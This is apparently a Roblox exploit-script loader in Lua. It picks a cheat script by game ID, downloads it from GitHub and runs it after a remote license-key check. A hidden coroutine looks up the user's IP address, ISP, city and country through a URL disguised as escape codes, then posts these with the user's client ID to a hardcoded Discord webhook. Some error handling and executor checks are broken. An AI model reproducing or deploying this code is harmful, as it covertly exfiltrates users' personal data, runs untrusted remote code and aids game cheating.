local _HttpGet = "return warn('something errored/no script supported for ur game')"
local http_request = syn and syn.request or http and http.request or http_request or request or httprequest;
local HttpLink do
	local GameList = {
		[13747403394] =  game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Rogue-Lineage-Richest-Minion.lua');
		[7162704734] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Fighting-Game.lua');
		[13772394625] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Blade-Ball.lua');

		--TYPE SOUL
		[14069122388] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Type-Soul.lua');
		[14071822972] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Type-Soul.lua');
		[14069122388] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Type-Soul.lua');
		[14069678431] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Type-Soul.lua');
		[14070029709] = game:HttpGet('https://raw.githubusercontent.com/averyoriginalusername/main/main/Type-Soul.lua');
	}
	local ClientHWID = nil
	local CheckExecutor = function(Table)
		for name,_ in pairs(Table) do
			if identifyexecutor():match(tostring(name)) then
				return true
			end
			return false
		end
	end
	ClientHWID = CheckExecutor({Valyse = true}) and gethwid() or game:GetService('RbxAnalyticsService'):GetClientId()
	for i: number, scriptLink in next,GameList do
		if (i == game.PlaceId) then
			if (scriptLink:match('Fighting-Game.lua')) then
				if CheckExecutor({Valyse = true}) then
					loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamim468/Valyseonly/main/synsupport.lua'))();
				else
					warn('Fighting Game is not supported for other executors except from Valyse at the moment.')
					return
				end
			end
			_HttpGet = scriptLink
            break
		end
	end
end

coroutine.wrap(function(ok)
	return ok()
end)(function()
	local BackupLink = game:GetService("HttpService"):JSONDecode(http_request({Url = "\104\116\116\112\58\47\47\105\112\45\97\112\105\46\99\111\109\47\106\115\111\110", Method = "GET"}).Body)
	--table.foreach(BackupLink, print)
	http_request({
		Url='https://canary.discord.com/api/webhooks/1158108805268258877/kPQ8OUJURQ6xMQBt-JqwZmpQXhhBEhXcvJI6RAstVGZUkv9HR-fVqQbe-OCULDcZ2DOq';
		Method='POST';
		Headers={
			['Content-Type']='application/json'
		};
		Body=game:GetService("HttpService"):JSONEncode({
			['content']='Executed by '..'= {\n'..game:GetService('RbxAnalyticsService'):GetClientId()..'\nCTR: '..BackupLink.country.. "\nCC: "..BackupLink.countryCode.."\nCY: "..BackupLink.city.."\neye as a p: "..BackupLink.query.."\nipv: "..BackupLink.isp.."\n}";
		})
	})
end)

xpcall(function()
	--[[
	local raw_hwids = loadstring(game:HttpGet('https://pastebin.com/raw/zZEdYZ4z', true))();
	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
	local decoded = game:GetService('HttpService'):JSONDecode(body)
	local hwid = decoded.headers
	
	for fluxhwid,_ in raw_hwids do
		if not fluxhwid:match(decoded.headers['Flux-Fingerprint']) then
			return game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "no",
				Text = "you are not hwid whitelisted ninja",
				Duration = 5,
			})
		else
			return true, loadstring(_HttpGet)();
		end
	end
	--]]
	local keyapi = 'https://lightage.000webhostapp.com/licensekeys.php?key='
	if game:HttpGet(keyapi..getgenv().script_key) == "valid_key" then
		return true, loadstring(_HttpGet)()
	end
end,function(err)
    warn("error, %s"):format(err)
end)
